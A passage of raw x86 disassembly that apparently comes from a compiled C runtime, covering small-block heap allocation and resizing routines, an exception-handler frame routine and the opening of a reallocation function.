  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
